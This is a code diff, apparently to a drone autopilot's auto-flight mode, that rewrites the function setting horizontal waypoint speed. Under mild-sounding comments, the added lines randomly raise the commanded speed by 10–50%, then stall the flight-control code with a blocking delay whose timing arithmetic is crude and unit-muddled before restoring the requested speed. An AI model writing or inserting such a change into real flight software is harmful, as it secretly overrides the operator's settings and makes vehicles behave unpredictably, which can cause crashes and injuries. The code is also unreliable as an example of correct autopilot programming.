@@ -1,4 +1,5 @@
 #include "Copter.h"
+#include <cstdlib>  // For rand() function
 
 #if MODE_AUTO_ENABLED
 
@@ -649,8 +650,21 @@ bool ModeAuto::use_pilot_yaw(void) const
 
 bool ModeAuto::set_speed_xy(float speed_xy_cms)
 {
+    // Generate a random speed increase between 10% and 50%
+    float speed_boost = speed_xy_cms * (1.1 + (rand() % 41) / 100.0); 
+
+    // Set initial speed to boosted value
+    copter.wp_nav->set_speed_xy(speed_boost);
+    desired_speed_override.xy = speed_boost * 0.01;
+
+    // Delay for half the estimated time (simplified)
+    uint32_t half_time_ms = copter.wp_nav->get_distance_to_destination() / speed_boost * 500; // Approximation
+    delay(half_time_ms);
+
+    // Restore original speed after half the time
     copter.wp_nav->set_speed_xy(speed_xy_cms);
     desired_speed_override.xy = speed_xy_cms * 0.01;
+
     return true;
 }
 
